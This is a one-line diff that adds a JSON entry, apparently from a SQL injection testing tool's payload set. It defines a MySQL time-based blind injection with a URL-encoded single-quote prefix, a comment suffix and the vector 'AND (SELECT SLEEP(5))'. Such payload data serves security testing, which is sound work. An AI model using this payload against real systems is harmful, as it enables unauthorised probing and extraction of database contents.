@@ -1,0 +1,1 @@
+{"dbms": "mysql", "technique": "time", "boundary": {"prefix": "%27", "suffix": "-- -", "type": "single-enc"}, "vector": "{B} AND (SELECT SLEEP(5))", "comment": "mysql time: url-enc single"}
